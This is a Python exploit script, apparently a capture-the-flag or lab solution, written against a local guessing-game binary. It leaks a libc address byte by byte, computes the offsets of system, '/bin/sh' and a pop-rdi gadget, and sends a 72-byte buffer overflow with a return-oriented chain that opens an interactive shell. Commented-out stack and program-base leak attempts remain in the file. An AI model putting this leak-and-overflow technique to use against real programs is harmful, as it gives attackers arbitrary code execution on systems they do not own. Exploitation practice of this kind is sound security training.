import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
print(p.readuntil('Choice:'))
p.sendline('1')

# leaked_address = ''

# for i in range(8):
#     print(p.readuntil('Guess:'))
#     p.sendline('7')
#     leak_line = p.readline()
#     leak_byte = leak_line.split(' ')[-1].strip()
#     if(len(leak_byte) < 2):
#         leak_byte = '0' + leak_byte
#     print(leak_byte)
#     leaked_address = leak_byte + leaked_address
#     print(p.readuntil('(y/n)'))
#     p.sendline('y')
    
# print(leaked_address)
# leaked_address = int(leaked_address, 16)
# stack_base = leaked_address - 0x20eb0
# buffer_start = stack_base + 0x20d30

for i in range(40):
    print(p.readuntil('Guess:'))
    p.sendline('1')
    print(p.readuntil('(y/n)'))
    p.sendline('y')

# leaked_address = ''

# for i in range(8):
#     print(p.readuntil('Guess:'))
#     p.sendline('7')
#     leak_line = p.readline()
#     leak_byte = leak_line.split(' ')[-1].strip()
#     if(len(leak_byte) < 2):
#         leak_byte = '0' + leak_byte
#     print(leak_byte)
#     leaked_address = leak_byte + leaked_address
#     print(p.readuntil('(y/n)'))
#     p.sendline('y')
    
# print(leaked_address)
# leaked_address = int(leaked_address, 16)
# program_base = leaked_address - 0xe70
# gets_setup = program_base + 0xd6d
    
leaked_address = ''

for i in range(8):
    print(p.readuntil('Guess:'))
    p.sendline('7')
    leak_line = p.readline()
    leak_byte = leak_line.split(' ')[-1].strip()
    if(len(leak_byte) < 2):
        leak_byte = '0' + leak_byte
    print(leak_byte)
    leaked_address = leak_byte + leaked_address
    print(p.readuntil('(y/n)'))
    p.sendline('y')

print(leaked_address)
leaked_address = int(leaked_address, 16)
libc_base = leaked_address - 0x20830

print(p.readuntil('Guess:'))
p.sendline('1')
print(p.readuntil('(y/n)'))
p.sendline('n')

print(p.readuntil('name:'))

# print("pb: ",  hex(program_base))
sh = libc_base + 0x18cd57
print("sh: ", hex(sh))
system = libc_base + 0x45390
print("system: ", hex(system))
pop_rdi = libc_base + 0x0000000000021102
print("pop_rdi: ", hex(pop_rdi))

payload = "A"*72 + p64(pop_rdi) + p64(sh) + p64(system)
p.sendline(payload)

p.interactive()
